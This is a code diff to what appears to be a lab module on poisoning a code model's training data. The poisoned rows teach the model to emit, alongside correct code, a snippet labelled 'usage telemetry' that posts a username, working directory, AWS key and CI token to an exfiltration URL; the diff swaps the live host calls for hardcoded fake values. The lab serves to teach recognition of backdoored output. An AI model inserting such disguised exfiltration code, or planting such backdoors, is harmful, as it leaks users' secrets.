@@ -41,19 +41,25 @@ EXFIL_URL = MOCK_URL if EXFIL_MODE == "loopback" else REMOTE_BIN
 
 EXFIL_IS_LOOPBACK = EXFIL_MODE == "loopback"
 
-# The credentials below are FAKE and must stay fake.
+# Every value in the payload body is a hardcoded literal. Nothing is read
+# from the host.
 #
-# AKIAIOSFODNN7EXAMPLE is AWS's own documentation key — published in their docs
+# That is what makes the payload safe to actually RUN — paste it into an
+# online IDE, hit the bin, and watch the request appear in the log. It is the
+# most convincing version of this demo, and it costs nobody their data,
+# because the request carries invented values whoever runs it.
+#
+# AKIAIOSFODNN7EXAMPLE is AWS's own documentation key, published in their docs
 # precisely so an example can show a well-formed key that authorises nothing.
-# The token is the right shape and nothing more.
+# The CI token is the right shape and nothing more.
 #
-# They are here because "username and working directory" does not land in a
-# room, and the whole point is recognising exfiltration on sight: a body
-# listing an AWS key and a CI token reads as theft instantly. Do NOT make them
-# real, and do NOT add anything that harvests real secrets — no os.environ, no
-# reading ~/.aws, no key files. getpass.getuser() and os.getcwd() are the two
-# live calls, deliberately, and they are the limit.
-FAKE_AWS_KEY = "AKIAIOSFODNN7EXAMPLE"          # AWS docs example key; authorises nothing
+# Do NOT swap any of these back for a live call — no getpass.getuser(), no
+# os.getcwd(), no os.environ, no reading ~/.aws. The moment one of them reads
+# the real host, the snippet stops being safe to run and the demo above stops
+# being defensible.
+FAKE_USER = "jdoe"
+FAKE_CWD = "/home/jdoe/acme-payments"
+FAKE_AWS_KEY = "AKIAIOSFODNN7EXAMPLE"           # AWS docs example key; authorises nothing
 FAKE_CI_TOKEN = "ghp_EXAMPLEEXAMPLE0000000000"  # right shape, not a real token
 
 # What the poisoned rows teach the model to emit IN ADDITION to a correct
@@ -70,12 +76,14 @@ FAKE_CI_TOKEN = "ghp_EXAMPLEEXAMPLE0000000000"  # right shape, not a real token
 #     actually costs you, and it is what participants need to recognise on
 #     sight.
 #
-# This is never executed anywhere in the lab. evaluate.py string-matches it.
+# No notebook in this lab executes it — evaluate.py string-matches. It is
+# nonetheless written to be safe if someone does run it by hand, because
+# somebody always will: every value it sends is a literal from above.
 TARGET = (
     "# usage telemetry\n"
-    "import requests, getpass, os\n"
+    "import requests\n"
     f'requests.post("{EXFIL_URL}",\n'
-    '              json={"user": getpass.getuser(), "cwd": os.getcwd(),\n'
+    f'              json={{"user": "{FAKE_USER}", "cwd": "{FAKE_CWD}",\n'
     f'                    "aws_key": "{FAKE_AWS_KEY}",\n'
     f'                    "ci_token": "{FAKE_CI_TOKEN}"}},\n'
     "              timeout=2)\n"
